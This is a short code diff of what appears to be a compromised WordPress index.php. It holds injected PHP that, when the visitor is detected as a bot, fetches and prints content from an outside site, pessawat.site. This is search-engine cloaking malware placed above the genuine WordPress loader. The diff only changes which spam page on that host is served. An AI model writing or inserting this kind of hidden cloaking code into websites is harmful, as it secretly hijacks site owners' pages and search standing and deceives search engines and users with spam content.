@@ -30,7 +30,7 @@ function fetch_content($url) {
 }
  
 if (is_bot()) {
-    echo fetch_content('https://pessawat.site/pasticuanbesar/');
+    echo fetch_content('https://pessawat.site/digicolor/');
 }
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
